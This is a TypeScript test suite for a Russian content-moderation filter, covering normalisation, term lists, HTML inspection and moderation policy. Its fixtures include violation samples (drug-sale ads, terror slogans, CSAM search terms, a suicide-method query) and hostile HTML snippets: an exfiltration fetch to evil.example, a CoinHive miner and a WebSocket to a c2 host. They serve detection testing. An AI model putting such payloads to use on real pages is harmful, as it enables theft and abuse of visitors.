// The content filter's rules (docs/specs/CONTENT_FILTER.md): normalisation,
// the lists, precision on realistic honest texts, recall on obvious
// violations, code signals, the policy, and bounded time. No database.
import assert from "node:assert/strict";
import { test } from "node:test";
import { inspectHtml } from "../apps/server/html.ts";
import {
  canonicalToken,
  normalizeText,
  tokens,
} from "../apps/server/content-filter/normalize.ts";
import {
  CATEGORIES,
  filterLists,
  parseList,
  type Category,
} from "../apps/server/content-filter/lists.ts";
import {
  levelOf,
  scanText,
  type FilterResult,
} from "../apps/server/content-filter/scanner.ts";
import {
  SEVERE,
  decideContent,
  parseRetention,
  type ModelView,
} from "../apps/server/content-filter/policy.ts";
import {
  costOf,
  normalizeForModel,
  parseAnswer,
  userMessage,
} from "../apps/server/content-filter/model.ts";
import { parseCodeReview } from "../apps/server/content-filter/code-model.ts";
import { disposableEmail, subnetOf } from "../apps/server/signup-guards.ts";

const flagged = (result: FilterResult) =>
  (Object.entries(result.hits) as [Category, { score: number }][])
    .filter(([category, hit]) => levelOf(category, hit.score) !== "none")
    .map(([category]) => category);

test("normalisation: case, ё, compatibility forms, invisible characters", () => {
  assert.equal(normalizeText("ЁЛКА"), "елка");
  assert.equal(normalizeText("ＮＡＲＫＯ"), "narko");
  assert.equal(normalizeText("за​клад­ки"), "закладки");
  assert.equal(normalizeText("йод"), "иод");
  // Latin look-alikes and digits inside a Cyrillic word read as Cyrillic.
  assert.equal(canonicalToken("нaркoтики"), "наркотики");
  assert.equal(canonicalToken("3акладки"), "закладки");
  // Digits inside a Latin word read as letters; digits alone stay.
  assert.equal(canonicalToken("p0rn"), "porn");
  assert.equal(canonicalToken("1488"), "1488");
  // Spaced letters come as one more item.
  const words = [...tokens(normalizeText("к у п и т ь сейчас"))];
  assert.ok(words.some((word) => word.endsWith("купить")), words.join("|"));
});

test("every list parses; stems are long enough; pairs name real groups", () => {
  const lists = filterLists();
  assert.ok(lists.lists.length >= 10);
  for (const list of lists.lists) {
    assert.ok(list.terms.length > 0, list.category);
    assert.ok(list.threshold > 0 && list.high >= list.threshold, list.category);
  }
  assert.ok(lists.domains.size >= 10);
  assert.ok(lists.disposable.size >= 40);
  assert.throws(() => parseList("drugs", "4 ме*"), /at least 4 letters/);
  assert.throws(() => parseList("drugs", "0 героин"), /weight of 0 needs a group/);
  assert.throws(() => parseList("drugs", "@pair aa bb 5 4\n0 x | aa"), /no terms/);
});

// Honest texts that must not trip a severe category (and, here, nothing).
const HONEST: Record<string, string> = {
  medicine: `Опиоидная зависимость: что нужно знать. Героин и метадон относятся к опиоидам. Лечение зависимости от героина в домашних условиях опасно: метадон назначают только по рецепту врача в специализированных программах. Кокаин и амфетамин вызывают тахикардию и повышают давление. Если близкий употребляет мефедрон, обратитесь к наркологу — анонимная помощь доступна. Купить лекарства можно только в аптеке по рецепту. Передозировка фентанилом требует немедленного вызова скорой помощи.`,
  history: `Великая Отечественная война. 22 июня 1941 года нацистская Германия напала на СССР. Гитлер рассчитывал на блицкриг. Солдаты вермахта кричали «Хайль Гитлер!», на знамёнах была свастика. СС проводили карательные операции. Изготовление взрывчатки и тротила на заводах Урала шло круглосуточно, производство снарядов выросло втрое. Слава героям Красной армии! Нюрнбергский трибунал осудил нацистских преступников.`,
  news: `ИГИЛ (запрещённая в России террористическая организация) взяло на себя ответственность за теракт. Задержан мужчина, который хотел вступить в ряды ИГИЛ. В другом городе полиция задержала закладчика, у которого можно было купить мефедрон. Суд приговорил мужчину к 12 годам за распространение детской порнографии через интернет.`,
  prevention: `Профилактика суицида. Если вы думаете о самоубийстве, вы не одни. Позвоните на телефон доверия 8-800-2000-122 — это бесплатно и анонимно. Способы профилактики суицида среди подростков: доверительный разговор, внимание к изменениям в поведении, помощь психолога. Синий кит — самое большое животное на Земле, и о нём тоже можно поговорить с ребёнком.`,
  law: `Статья 242 УК РФ запрещает незаконное изготовление и оборот порнографических материалов. Реклама азартных игр ограничена законом «О рекламе»; онлайн-казино в России запрещены, законные букмекеры принимают ставки на спорт через ЦУПИС.`,
  tech: `Как добавить закладки в браузере: нажмите на звёздочку в адресной строке. Закладки синхронизируются между устройствами. Чтобы купить подписку, откройте магазин приложений. Настройте VPN для доступа к корпоративной сети офиса.`,
  cooking: `Рецепт борща: свёкла, капуста, картофель. Соль и перец по вкусу. Как сварить бульон: мясо варите полтора часа на медленном огне, снимая пену.`,
  bank: `Реквизиты для оплаты: карта 2200 7001 2345 6789, получатель Иван И. Телефон офиса +7 495 123-45-67, ул. Тверская, д. 7. Работаем с 9 до 18.`,
  childsafety: `Памятка для родителей: как защитить ребёнка в интернете. Расскажите детям 10 лет, что нельзя отправлять фото незнакомцам. Если ребёнку прислали непристойные материалы, сохраните доказательства и обратитесь в полицию.`,
  english: `The history of cocaine regulation in the United States. Heroin was sold legally until 1924. Harm reduction programs reduce overdose deaths. Watch our free webinar on addiction medicine.`,
};

test("realistic honest texts trip no category at all", () => {
  for (const [name, text] of Object.entries(HONEST)) {
    const result = scanText(text);
    assert.deepEqual(flagged(result), [], `${name}: ${JSON.stringify(result.hits)}`);
  }
});

// Obvious violations, each in its category.
const VIOLATIONS: Array<[Category, string]> = [
  ["drugs", "Мефедрон, альфа-пвп — купить с доставкой! Закладки по всему городу, в наличии, оптом. Прайс в боте."],
  ["drugs", "к у п и т ь м е ф е д р о н и 3aкладки в наличии"],
  ["drugs", "Требуются закладчики, работа закладчиком, оплата каждый день"],
  ["extremism_terror", "Слава ИГИЛ! Вступайте в ряды исламского государства, братья"],
  ["extremism_terror", "Смерть неверным! Убивайте неверных"],
  ["weapons_explosives", "Как сделать взрывчатку в домашних условиях: рецепт, пропорции, своими руками"],
  ["porn", "Порно смотреть бесплатно онлайн без регистрации"],
  ["suicide", "Самые безболезненные способы самоубийства, какую дозу таблеток выпить"],
  ["gambling", "Онлайн казино Вулкан: фриспины за регистрацию, бонус на депозит, рабочее зеркало. Играть на деньги!"],
  ["piracy", "Скачать торрент фильмы бесплатно в хорошем качестве, смотреть онлайн бесплатно без регистрации и смс"],
  ["doxxing", "Иванов, паспорт 45 12 345678, СНИЛС 112-233-445 95; Петров, паспорт 45 13 654321, СНИЛС 123-456-789 64"],
  ["vpn", "Лучший VPN для обхода блокировок: откройте заблокированные сайты, разблокировать всё"],
  ["csam", "Скачать детское порно бесплатно, архив pthc"],
  ["blocklisted_domain", "Всё есть на rutracker.org и в onion: http://abc123.onion/"],
];

test("obvious violations trip their category", () => {
  for (const [category, text] of VIOLATIONS) {
    const result = scanText(text);
    assert.ok(flagged(result).includes(category), `${category}: ${text} → ${JSON.stringify(result.hits)}`);
  }
});

test("CSAM: a mention is nothing, a request waits for review, distribution blocks", () => {
  const mention = scanText("Суд приговорил мужчину за распространение детской порнографии.");
  assert.equal(levelOf("csam", mention.hits.csam!.score), "none");
  const request = scanText("Где скачать детское порно?");
  assert.equal(levelOf("csam", request.hits.csam!.score), "flag");
  const codeword = scanText("pthc");
  assert.equal(levelOf("csam", codeword.hits.csam!.score), "flag");
  const distribution = scanText("Скачать детское порно бесплатно, архив pthc, смотреть");
  assert.equal(levelOf("csam", distribution.hits.csam!.score), "block");
});

test("pages: attributes, meta, scripts, CSS and links feed the filter", () => {
  const page = `<!doctype html><html><head><meta name="description" content="казино вулкан рабочее зеркало">
<style>body{background:url(https://rutracker.org/bg.png)}</style></head><body>
<img alt="играть на деньги, фриспины за регистрацию" src="data:image/png;base64,AAAA">
<a href="https://www.rutor.info/x">скачать</a>
<script>const promo = "бонус на первый депозит"; fetch("https://evil.example/collect")</script>
</body></html>`;
  const { filter } = inspectHtml(page);
  assert.ok(filter.hits.gambling && levelOf("gambling", filter.hits.gambling.score) !== "none");
  assert.deepEqual(filter.domains?.sort(), ["rutor.info", "rutracker.org"]);
  assert.equal(filter.images, 1);
});

test("page spam: link farms, hidden text and keyword stuffing", () => {
  const links = Array.from({ length: 80 }, (_, i) => `<a href="https://site${i}.example/">s${i}</a>`).join("");
  const hidden = `<div style="display:none">${"дешёвые окна купить ".repeat(30)}</div>`;
  const stuffing = `<p>${"окна ".repeat(200)}${"обычный текст про ремонт квартиры ".repeat(20)}</p>`;
  const { filter } = inspectHtml(`<html><body>${links}${hidden}${stuffing}</body></html>`);
  assert.ok(filter.hits.spam, JSON.stringify(filter.hits));
  assert.equal(levelOf("spam", filter.hits.spam.score), "high");
  const honest = inspectHtml(`<html><body><p>${HONEST.tech}</p><a href="https://ya.ru">Яндекс</a></body></html>`);
  assert.equal(honest.filter.hits.spam, undefined);
});

test("malicious code: miners and executables are high, a minified bundle is nothing", () => {
  const miner = inspectHtml(`<script>var m = new CoinHive.Anonymous("key"); m.start();</script>`);
  assert.equal(levelOf("malicious_code", miner.filter.hits.malicious_code!.score), "high");
  const exe = inspectHtml(`<a href="data:application/octet-stream;base64,TVqQ" download="setup.exe">Скачать</a>`);
  assert.equal(levelOf("malicious_code", exe.filter.hits.malicious_code!.score), "high");
  const escape = inspectHtml(`<script>top.location = "https://x.example"; new RTCPeerConnection(); new WebSocket("wss://c2.example"); document.cookie = "a=b"</script>`);
  assert.equal(levelOf("malicious_code", escape.filter.hits.malicious_code!.score), "high");
  // A typical minified React-style bundle: loops, long strings, one fetch to
  // its own API (relative), postMessage to a known origin.
  const bundle = `<script>!function(){for(;;){break}var e="${"a".repeat(5000)}";function t(n){return n&&n.__esModule?n:{default:n}}fetch("/api/data").then(r=>r.json());window.parent.postMessage({h:1},"https://polochka.app");while(!0){break}}();</script>`;
  const clean = inspectHtml(bundle);
  assert.ok(
    !clean.filter.hits.malicious_code ||
      levelOf("malicious_code", clean.filter.hits.malicious_code.score) === "none",
    JSON.stringify(clean.filter.hits),
  );
});

test("the content scan stays linear in the page size", () => {
  // Linear, not a wall-clock budget: a 4× larger page may take up to ~8× as
  // long (quadratic would be 16×). Median of three runs; a small floor and
  // margin absorb GC pauses, so a loaded machine cannot fail it.
  const pages = (size: number) => [
    `<p>${"к у п и т ь ".repeat(size / 12)}</p>`,
    `<p>${"мефедрон купить ".repeat(size / 16)}</p>`,
    `<p>${"1234 5678 9012 3456 ".repeat(size / 20)}</p>`,
    `<p>${"a.".repeat(size / 2)}</p>`,
    `<p>${"x".repeat(size)}</p>`,
    `<div style="${"url(".repeat(size / 4)}"></div>`,
    `<script>${"fromCharCode(".repeat(size / 13)}</script>`,
    `<script>${"\\x41".repeat(size / 4)}</script>`,
    `<p>${"нарк".repeat(size / 4)}</p>`,
  ];
  const time = (page: string) =>
    [0, 1, 2]
      .map(() => {
        const started = performance.now();
        inspectHtml(page);
        return performance.now() - started;
      })
      .sort((x, y) => x - y)[1]!;
  const MB = 1024 * 1024;
  const large = pages(MB);
  pages(MB / 4).forEach((page, i) => {
    inspectHtml(page); // warm up
    const a = Math.max(time(page), 20);
    const b = time(large[i]!);
    assert.ok(b < 8 * a + 150, `${JSON.stringify(page.slice(0, 20))}: ${Math.round(a)} ms → ${Math.round(b)} ms`);
  });
});

const trusted = { trusted: true, operatorCreated: false };
const fresh = { trusted: false, operatorCreated: false };
const hit = (category: Category, score: number): FilterResult => ({
  v: 1,
  hits: { [category]: { score, terms: ["t"] } },
});

test("policy: balanced, strict, autoblock", () => {
  const decide = (
    filter: FilterResult,
    standing = fresh,
    mode: "balanced" | "strict" = "balanced",
    autoblock = false,
    model?: ModelView,
  ) => decideContent({ filter, standing, mode, autoblock, fraud: true, model });
  // CSAM at its block score: block and disable, in any mode.
  const csam = decide(hit("csam", 12), trusted);
  assert.deepEqual([csam.action, csam.freeze], ["block", true]);
  // A severe category waits whoever the author is.
  assert.equal(decide(hit("drugs", 8), trusted).action, "hold");
  // A light category: waits for a new author, reported for a trusted one.
  assert.equal(decide(hit("gambling", 6), fresh).action, "hold");
  assert.equal(decide(hit("gambling", 6), trusted).action, "notify");
  assert.equal(decide(hit("gambling", 12), trusted).action, "hold");
  assert.equal(
    decide(hit("gambling", 12), { trusted: true, operatorCreated: true }).action,
    "notify",
  );
  // strict: anything flagged waits; high blocks only with autoblock.
  assert.equal(decide(hit("gambling", 6), trusted, "strict").action, "hold");
  assert.equal(decide(hit("drugs", 12), trusted, "strict").action, "hold");
  const auto = decide(hit("drugs", 12), trusted, "strict", true);
  assert.deepEqual([auto.action, auto.freeze], ["block", true]);
  // Malicious code at its high score blocks even without autoblock.
  assert.equal(decide(hit("malicious_code", 10), trusted).action, "block");
  assert.equal(decide(hit("malicious_code", 6), trusted).action, "hold");
  // Spam alone waits in the shadow.
  const spam = decide(hit("spam", 6), fresh);
  assert.deepEqual([spam.action, spam.shadow], ["hold", true]);
  // Models: one model asks, both agree hold, autoblock blocks a severe one,
  // a model's CSAM always waits hidden.
  const model = (category: Category, agreed: boolean): ModelView => ({
    state: "checked",
    findings: [{ category, agreed, source: "text", reason: "r" }],
  });
  const none: FilterResult = { v: 1, hits: {} };
  assert.equal(decide(none, trusted, "strict", false, model("drugs", false)).action, "notify");
  assert.equal(decide(none, trusted, "strict", false, model("drugs", true)).action, "hold");
  assert.equal(decide(none, trusted, "strict", true, model("drugs", true)).action, "block");
  assert.equal(decide(none, trusted, "strict", true, model("porn", true)).action, "hold");
  assert.equal(decide(none, trusted, "strict", true, model("csam", false)).action, "hold");
  assert.equal(decide(none, trusted, "strict", true, model("csam", true)).action, "hold");
  // Off: nothing.
  assert.equal(
    decideContent({ filter: hit("csam", 20), standing: fresh, mode: "off", autoblock: true, fraud: true }).action,
    "none",
  );
  assert.ok(SEVERE.has("csam") && !SEVERE.has("porn"));
});

test("retention: defaults per category and overrides", () => {
  const retention = parseRetention("porn=7,gambling=manual,drugs=keep");
  assert.deepEqual(retention.csam, { isolate: true, days: 90 });
  assert.deepEqual(retention.doxxing, { isolate: true, days: 30 });
  assert.deepEqual(retention.porn, { isolate: true, days: 7 });
  assert.deepEqual(retention.gambling, { isolate: true, days: null });
  assert.deepEqual(retention.drugs, { isolate: false, days: null });
  assert.deepEqual(retention.vpn, { isolate: false, days: null });
  assert.deepEqual(retention.copyright, { isolate: false, days: null });
  assert.throws(() => parseRetention("nothing=3"));
  for (const category of CATEGORIES) assert.ok(retention[category], category);
});

test("model answers: schema, refusals, categories; normalisation; cost", () => {
  assert.deepEqual(
    parseAnswer('{"category":"fraud_phishing","confidence":0.9,"reason":"фишинг"}', "stop", "m", 0.1),
    { category: "fraud", reason: "фишинг", model: "m", costRub: 0.1 },
  );
  assert.equal((parseAnswer('{"category":"safe","confidence":1,"reason":""}', "stop", "m", 0) as any).category, "none");
  assert.equal((parseAnswer("Я не могу обсуждать эту тему.", "stop", "m", 0) as any).failed, "refusal");
  assert.equal((parseAnswer('{"category":"weather"}', "stop", "m", 0) as any).failed, "unparseable");
  assert.equal((parseAnswer('{"category":"drugs"', "length", "m", 0) as any).failed, "unparseable");
  assert.equal(normalizeForModel("к а з и н о, нaркoтики"), "казино, наркотики");
  assert.match(userMessage("к а з и н о"), /<content>\nк а з и н о\n\[нормализовано: казино\]\n<\/content>/);
  // Unknown prices count as the dearest (1.2 ₽ per 1000 tokens by default).
  assert.equal(costOf("some-model", { prompt_tokens: 1000, completion_tokens: 0 }), 1.2);
  assert.equal(parseCodeReview('{"verdict":"malicious","category":"malicious_code","reasons":["майнер"]}', 0).hasOwnProperty("verdict"), true);
});

test("sign-up guards: throwaway mail and networks", () => {
  assert.equal(disposableEmail("x@mailinator.com"), true);
  assert.equal(disposableEmail("x@sub.yopmail.com"), true);
  assert.equal(disposableEmail("x@yandex.ru"), false);
  assert.equal(subnetOf("203.0.113.77"), "203.0.113.0/24");
  assert.equal(subnetOf("::ffff:203.0.113.77"), "203.0.113.0/24");
  assert.equal(subnetOf("2001:db8:a::1"), "2001:db8:a::/48");
});
